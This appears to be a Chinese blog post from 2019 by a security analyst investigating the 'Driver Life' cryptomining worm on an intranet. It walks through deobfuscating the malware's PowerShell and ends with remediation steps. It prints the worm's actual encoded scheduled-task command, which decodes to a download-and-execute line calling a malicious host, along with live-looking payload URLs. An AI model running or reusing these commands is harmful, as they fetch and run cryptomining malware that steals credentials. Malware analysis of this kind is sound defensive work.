---
title: Default page 
date: 2019-02-15
link:
categories:
- 分析
tags:
- powershell
- 挖矿
- 驱动人生
- 恶意脚本
---

##0x00 背景  
公司临时派遣到某单位临时支撑，第一天就出问题发现内网某台服务器在进行SBM爆破，登录服务器远程桌面发现大量powershell连接进程，通过询问工作人员了解到并无业务需要用到`powershell`  
![](https://ws4.sinaimg.cn/large/006tNc79ly1g280sj5eopj30n208ktaj.jpg)  

且在目标服务器(`10.*.*.*`)上存在连接内网其它服务器`445`端口的情况，且连接目标`IP`不断变化。部分`IP`如下：  
```
10.*.*.*
10.*.*.*
10.*.*.*
10.*.*.*
```

![](https://ws3.sinaimg.cn/large/006tNc79ly1g280t6z1c1j30n207wwg7.jpg)  

![](https://ws2.sinaimg.cn/large/006tNc79ly1g280tbwdmxj30n202ydg7.jpg)  

![](https://ws3.sinaimg.cn/large/006tNc79ly1g280tjymi7j30n2096zmh.jpg)  

在征得工作人员同意的情况下结束`powershell`进程，再次查看端口情况暂时未发现`445`端口连接情况。  

![](https://ws3.sinaimg.cn/large/006tNc79ly1g280tuac0bj30n20gowii.jpg)  

几天后一次日常日志巡检中再次发现smb服务爆破日志，定位ip发现是一台个人办公PC，遂故事开始。  

##0x01 PC机上的计划任务  
在已沦陷`PC`上进行进程、启动项、计划任务等手段排查，找到`powershell`进程以及`powershell`计划任务，从计划任务中`copy`出数据如下，对此`powerhsell`脚本进行简单分析。  
`powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZABkAHAALgBuAGUAdAAvAHYAPwBnAHAAaAAxADkAMAA0ADEANwAnACkA`
![](https://ws1.sinaimg.cn/large/006tNc79ly1g27z2apm5cj30n208cadc.jpg)  
Base64解码后得到poershell代码  
`IEX (New-Object Net.WebClient).downloadstring('http://v.bddp.net/v?gph190417')`
 
浏览器访问：` http://v.bddp.net/v?gph190417`  
![](https://ws4.sinaimg.cn/large/006tNc79ly1g27z3oo4igj30n209gq7u.jpg)  

##0x02 计划任务下载脚本及解密  
去掉代码开头的`Invoke-Expression`将剩下的内容保存为`*.ps1`在`powershell`环境中运行下得到新文件`de.ps1`  
![](https://ws3.sinaimg.cn/large/006tNc79ly1g27z4j9dwdj30n209gabc.jpg)  

查看`de.ps1`中的代码发现仍旧不可读，去掉`de.ps1`文件中代码最后的` |&( $shEllid[1]+$sHellid[13]+'X') `并保存，继续运行`de.ps1`文件得到`de2.ps1`文件。
![](https://ws2.sinaimg.cn/large/006tNc79ly1g27z4y4b6bj30n20aota5.jpg)  

大概浏览下`de2.ps1`内容，对当前`PC`物理地址获取、进程查看、权限判断和一些日志文件输出？后续代码中还有另外的一些脚本文件下载。  
![](https://ws4.sinaimg.cn/large/006tNc79ly1g27z5cfqz5j30n20bggmv.jpg)  

在windows7测试虚拟机里调试了下，下载了两个脚本：
`http://v.y6h.net/g?l190418`   
下载[`g`](http://down.bddp.net/newol.dat?allv6&mac=00-0C-29-80-AA-31&av=&version=6.1.7601&bit=64-bit&flag2=False&domain=WORKGROUP&user=kzaopa&PS=False)文件  
下载[` d64.dat`]( http://down.bddp.net/d64.dat?allv6&mac=00-0C-29-80-AA-31&av=&version=6.1.7601&bit=64-bit&flag2=True&domain=WORKGROUP&user=kzaopa&PS=False)文件  

##0x03 d64.dat核心文件解密  
看文件`d64.dat`将文件后缀修改为`.ps1`。关键代码：  
` sET-VArIaBLe：设置变量的值，如果该变量还不存在，则创建该变量`  
![](https://ws3.sinaimg.cn/large/006tNc79ly1g27z5x5i8cj30n203owf2.jpg)  

`字符串反转，利用join拼接，再用iex函数进行加密`  
![](https://ws1.sinaimg.cn/large/006tNc79ly1g27z65iovrj30n201y3yl.jpg)  
将核心代码提取出来，并进行字符串反转拼接输出到`fz1.ps1`，此时代码不可读将文件末尾的` |IEx `去掉，再次运行`fz1.ps1`得到文件`fz2.ps1`，代码仍不可读去掉`fz2.ps1`文件中开头的` . ( $SHELLId[1]+$sHELLiD[13]+'X') `再次运行得到文件`fz3.ps1`，此时代码可读。  
![](https://ws1.sinaimg.cn/large/006tNc79ly1g27z6ds7mpj30n209cwf4.jpg)  

那么文件`d64.dat`的作用是干嘛的呢？尝试运行，界面如下不难看出是某种挖矿程序。  
![](https://ws3.sinaimg.cn/large/006tNc79ly1g27z6pw6x7j30n20d841b.jpg)  

在网上找到相似度极高的同类型项目，根据介绍可以看出该文件是用来将dll/exe加载到powershell进程中。  
![](https://ws3.sinaimg.cn/large/006tNc79ly1g27z6yj3u0j30n2096wfj.jpg)  

具体文件为：`https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1`  

##0x04  
解密下载的`g`文件，同样去掉`Invoke-Expression $`将文件保存后运行，得到`gnew.ps1`文件，此时不可读。内容开头定义了变量`$PUnHZ`，结尾处关键代码：  
![](https://ws2.sinaimg.cn/large/006tNc79ly1g27z76niytj30n201m0sp.jpg)  

Powershell将变量的相关信息的记录存放在名为variable:的驱动中，代码`(GET-cHildItEM vaRIAblE:PUnHZ ).VaLUe`获取变量` PUnHZ `的值。  
![](https://ws3.sinaimg.cn/large/006tNc79ly1g27z7bo2n0j30m605wdg7.jpg)  

` [array]::rEVERSe((GET-cHildItEM  vaRIAblE:PUnHZ  ).VaLUe ) ;
-JOiN (GET-cHildItEM  vaRIAblE:PUnHZ  ).VaLUe `
上面两行代码将变量`$ PUnHZ `的值重载反转并用join拼接。  
` ((GV '*mDr*').nAME[3,11,2]-joiN'') `最后这一段其实就是iex函数。  
![](https://ws2.sinaimg.cn/large/006tNc79ly1g27z7ku45tj30ku02at8r.jpg)  

所以去掉` | & ((GV '*mDr*').nAME[3,11,2]-joiN'') `保存文件，运行生成新文件再次重复2次解密步骤后得到`gnewzz.ps1`文件，部分代码如下:  
![](https://ws2.sinaimg.cn/large/006tNc79ly1g27z7rp5aaj30n209kwf1.jpg)  
这里又回到了`0x02`这一步了，猜测是针对不同环境的PC加载的恶意脚本有所不同。  

##0x05 分析及总结  
个人猜测挖矿木马在获取到某台PC权限之后，运行恶意powershell脚本；脚本会对当前电脑信息进行收集以及网络环境进行判断，然后再针对性的进行脚本下载。所以发现运行有该木马病毒的电脑会有些细微不同，如计划任务、是否进行smb服务爆破等。  

整个挖矿木马的执行流程：  
* 初始化：执行powershell命令，后续的计划任务与此命令相同；
* 信息收集：收集受控主机上部分系统信息，判断并下载相对应脚本；
* 挖矿及横向移动：执行对应的脚本/文件，开始挖矿进程以及后续的横向移动操作。

整个事件回顾：  
* 12月14日，一款通过“驱动人生”升级通道，并同时利用“永恒之蓝”高危漏洞传播的木马爆发；

* “驱动人生”木马会利用高危漏洞在企业内网呈蠕虫式传播，特点如下：
> 驱动人生升级通道传播的病毒会在中毒电脑安装云控木马；  
病毒会利用永恒之蓝漏洞在局域网内主动扩散；  
通过云端控制收集中毒电脑部分信息，接受云端指令在中毒电脑进行门罗币挖矿。  

* 在各大企业以及安全厂商对该木马做出限制措施，如后门更新域名的拦截、特征判断等操作后该病毒进行了升级更新，已发现的手段包括但不限于：后门下载域名/ip变化、病毒样本更新以及注册表启动项、开始菜单启动项、计划任务进自启动等。  

* 此次日常日志巡查发现的安全事件以及通过前文中对恶意powershell脚本的分析，基本可以判定为“驱动人生”木马挖矿同类事件。前文中对核心文件`d64.dat`运行后具体动作未做过多说明，这里借鉴他人的分析：
> 关闭amis（防病毒接口）；  
通过mimikatz（mimikatz没有落地，只在内存中运行）读取系统密码和系统可能保存的私钥，收集系统信息方便做横向移动；  
修改注册表，计划任务进行后门种植；  
加载MS17-010扫描、利用脚本以及SMB服务爆破脚本；  

##0x06 排查及修复  
* 计划任务
* Powershell进程
* C:\\windows\\system32中是否有svhost
* 全盘查找文件：
> ttt.exe  
svvhost.exe  
svchost2.exe  
svhhost.exe  

* 注册列表：
> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver  
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers  

* 系统补丁更新，排查弱口令，关闭不必要的服务等；

* 详细参见：驱动人生挖矿木马处置流程

##0x07 参考  
[powershell脚本解密](https://www.freebuf.com/articles/system/181697.html)   
[核心文件分析](https://www.jianshu.com/p/91bf7ecfbfb1?tdsourcetag=s_pctim_aiomsg )   
[“驱动人生”木马详细分析报告](https://www.freebuf.com/column/192015.html)  

